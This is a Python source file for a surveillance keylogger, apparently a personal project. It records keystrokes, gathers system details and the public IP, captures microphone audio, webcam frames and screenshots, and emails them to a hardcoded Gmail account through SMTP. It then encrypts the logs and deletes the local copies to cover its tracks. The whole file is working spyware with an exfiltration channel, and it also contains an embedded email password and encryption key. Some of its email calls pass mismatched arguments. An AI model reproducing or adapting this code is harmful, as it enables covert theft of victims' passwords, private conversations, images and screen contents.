### LIBRARIES ###

# email libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email import encoders

import cv2

import smtplib

# to collect information
import socket 
import platform
# from tkinter import Wb

# import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os 

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab



# global variables
email_address = "keyloggerblablaproject@gmail.com"
password = "FREAKINGblabla69"
toaddr = "keyloggerblablaproject@gmail.com"

file_path = "/Users/williamyang/Desktop/smthg_awesome/"
keys_information = "key_log4.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
camera_information = "camera.png"

keys_information_e = "e_key_log4.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

key = "-MfQZkl4emBnkTZlRh_lo3Dik-1WBxI_dgXRzJzc6Ps="

microphone_time = 2

# every interation lasts for 15 seconds
time_iteration = 15 
num_iterations_end = 3

def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Public IP address could not be obtained\n")
        
        # write processor information
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

# def copy_clipboard():
#     with open(file_path + clipboard_information, "a") as f:
#         try:
#             win32clipboard.OpenClipboard()
#             clipboard_data = win32clipboard.GetClipboardData()
#             win32clipboard.CloseClipboard()
            
#             f.write("Clipboard Data: \n" + clipboard_data)

#         except:
#             f.write("Clipboard could nit be be copied")

# copy_clipboard()

def microphone():
    
    # sampling frequency
    fs = 44100
    
    # duration of recording
    seconds = microphone_time
    
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    
    write(file_path + audio_information, fs, myrecording)
    
microphone()

def camera():
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened correctly
    if not cap.isOpened():
        raise IOError("Cannot open webcam")
    
    result = 0
    while(result < 2):
        # Capture the video frame by frame
        ret, frame = cap.read()
    
        # Display the resulting frame
        cv2.imshow('frame', frame)
        cv2.imwrite(file_path + camera_information, frame)
        result += 1
    
    # After the loop release the cap object
    cap.release()
    print("closing camera")
    # Destroy all the windows
    cv2.destroyAllWindows()

camera()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)
    
screenshot()

def send_email(filename, keys, system, scrshot, camera, audio, toaddr):

    print(f"keys: {keys}\n")
    print(f"system: {system}\n")
    print(f"scrshot: {scrshot}\n")
    print(f"audio: {audio}\n")
    fromaddr = email_address
    
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr 
    msg['Subject'] = "Log File"

    # create the body of the email
    body = "mail_body"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    
    # read the attachment as binary
    keys = open(keys, 'rb')
    system = open(system, 'rb')
    scrshot = open(scrshot, 'rb')
    audio = open(audio, 'rb')
    camera = open(camera, 'rb')

    # create the mime base
    p_keys = MIMEBase('application', 'octet-stream')
    p_system = MIMEBase('application', 'octet-stream')
    p_scrshot = MIMEImage(scrshot.read())
    # p_audio = MIMEApplication(audio.read())
    p_audio = MIMEAudio(audio.read(), _subtype="wav")
    p_camera = MIMEImage(camera.read())
    
    # encode the message
    p_keys.set_payload((keys).read())
    encoders.encode_base64(p_keys)
    p_system.set_payload((system).read())
    encoders.encode_base64(p_system)
    
    # create email header
    # print(f"filename {filename}\n")
    p_keys.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p_keys)
    p_scrshot.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p_scrshot)
    p_camera.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p_camera)
    p_system.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p_system)
    p_audio.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p_audio)

    
    # create SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    
    # convert multipart message into a string
    text = msg.as_string()
    
    # send message
    s.sendmail(fromaddr, toaddr, text)
    
    # quit session
    s.quit()
    
send_email(
    keys_information, 
    file_path + keys_information, 
    file_path + system_information, 
    file_path + screenshot_information, 
    file_path + camera_information, 
    file_path + audio_information, 
    toaddr
)

num_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while num_iterations < num_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        
        keys.append(key)
        count += 1
        currentTime = time.time()
        
        # restart count and keys list 
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                
                # replace each single quote with nothing
                k = str(key).replace("'", "")
                
                # every time a space bar is pressed
                # a new line is pressed
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
                    
    def on_release(key): 
        
        # if esc is pressed, it exits keylogger
        if key == Key.esc:
            return False
        if currentTime < stoppingTime:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
    if currentTime > stoppingTime:
        
        # clean off the key log file for the next execution
        with open(file_path + keys_information, "w") as f:
            f.write(" ")
        # print("CLEAN OFF FILE")
        
        send_email()
        
        num_iterations += 1
        
        # update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
         
        
files_to_encrypt = [file_path + system_information, file_path + clipboard_information, file_path + keys_information]
encrypted_file_names = [file_path + system_information_e, file_path + clipboard_information_e, file_path + keys_information_e]

count = 0

for e_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
        
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
    
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_path + file)
# time.sleep(60)
